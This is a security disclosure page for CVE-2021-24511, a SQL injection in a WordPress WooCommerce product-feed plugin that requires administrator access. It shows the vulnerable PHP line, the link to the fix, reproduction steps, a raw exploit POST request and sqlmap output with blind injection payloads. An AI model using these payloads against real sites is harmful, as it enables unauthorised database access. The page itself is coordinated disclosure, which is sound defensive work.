<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : purple-xmls-google-product-feed-for-woocommerce | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Purple Xmls Google Product Feed for Woocommerce</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/purple-xmls-google-product-feed-for-woocommerce/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : purple-xmls-google-product-feed-for-woocommerce</a></div>
<div>Effected Version : 3.3.0.3 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Administrator</div>
<div>CVE Number : CVE-2021-24511</div>
<div>Identified by : <a href="/author/syed_sheeraz_ali/">Syed Sheeraz Ali</a></div>
<div><a href="https://wpscan.com/plugin/purple-xmls-google-product-feed-for-woocommerce/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>May 9, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	May 31, 2021 : Plugin  Updated</li>
	
	
	<li>June 10, 2021 : CVE Assigned</li>
	
	<li>August 22, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>Vulnerable File: <code>/core/ajax/wp/fetch_product_ajax.php#352</code></p>
<p>Vulnerable Code block and parameter:</p>
<p>Administrator level SQLi for parameter <code>product_id</code></p>
<p>Vulnerable Code: <a href="https://plugins.trac.wordpress.org/browser/purple-xmls-google-product-feed-for-woocommerce/trunk/core/ajax/wp/fetch_product_ajax.php?rev=2172760#352" target="_blank" rel="noreferrer noopener nofollow">/core/ajax/wp/fetch_product_ajax.php#352</a>
</p>
<pre><code>352:        $check = $wpdb-&gt;get_row(&quot;SELECT COUNT(product_id) as count FROM $table_name WHERE product_id = &quot; . sanitize_text_field($_POST['product_id']));
</code></pre><p><a href="https://plugins.trac.wordpress.org/changeset/2532093/" target="_blank" rel="noreferrer noopener nofollow">Fixed Commit: https://plugins.trac.wordpress.org/changeset/2532093/</a>
</p>
<h2 id="poc-screenshots">PoC Screenshots</h2>
<p><img src="/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot1.png" alt="PoC Screenshot">
<img src="/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot2.png" alt="PoC Screenshot">
<img src="/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot3.png" alt="PoC Screenshot">
<img src="/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot4.png" alt="PoC Screenshot"></p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<p>we do not know how to reach this Parameter from the UI so these are the steps how we reched it after code review.
install woocommrece and this plugin then go to create feed go to custom product feed and search something capture the requst in burp
change the q params value to given value savep and add these two params with it id Parameter will have a sqli.</p>
<pre><code>&amp;q=savep&amp;local_cat_ids=1&amp;product_id=1
</code></pre><h4 id="exploit">Exploit</h4>
<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 172.28.128.50
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-GPC: 1
Origin: http://172.28.128.50
Referer: http://172.28.128.50/wp-admin/admin.php?page=cart-product-feed-admin
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1620443683%7C2MZuCYsK7cynrQu2tWF9whgE1vtkxLnVPFHiGsJ9Fi0%7C1471328ee46323d87aa594ee1c6acb9ed6f70fbc9942f0148ff45ad621d76e57; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3AiQVT6EvbuCedvp65Wb1%2BuUEl; PHPSESSID=d8f8beced189cdd7cb849dedbb8a8383; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1620443683%7C2MZuCYsK7cynrQu2tWF9whgE1vtkxLnVPFHiGsJ9Fi0%7C1ae6e450dc0b415e0d67668228afb2a7317b368b4ef2f0d49e6cbb4b71a6a811; wp-settings-time-1=1620279779
Connection: close

keyword=eewr&amp;searchfilters=sku&amp;security=c3b54163aa&amp;action=cpf_cart_product&amp;feedpath=core%2Fajax%2Fwp%2Ffetch_product_ajax.php&amp;q=savep&amp;local_cat_ids=1&amp;product_id=1
</code></pre><pre><code>sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: product_id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: keyword=eewr&amp;searchfilters=sku&amp;security=c3b54163aa&amp;action=cpf_cart_product&amp;feedpath=core/ajax/wp/fetch_product_ajax.php&amp;q=savep&amp;local_cat_ids=1&amp;product_id=1 AND 6853=6853

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: keyword=eewr&amp;searchfilters=sku&amp;security=c3b54163aa&amp;action=cpf_cart_product&amp;feedpath=core/ajax/wp/fetch_product_ajax.php&amp;q=savep&amp;local_cat_ids=1&amp;product_id=1 AND (SELECT 7403 FROM (SELECT(SLEEP(5)))gJUc)
---
[11:44:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL &gt;= 5.0.12
[11:44:42] [INFO] fetching current user
[11:44:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:44:42] [INFO] retrieved: bob@localhost
current user: 'bob@localhost'

[*] ending @ 11:44:46 /2021-05-06/
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

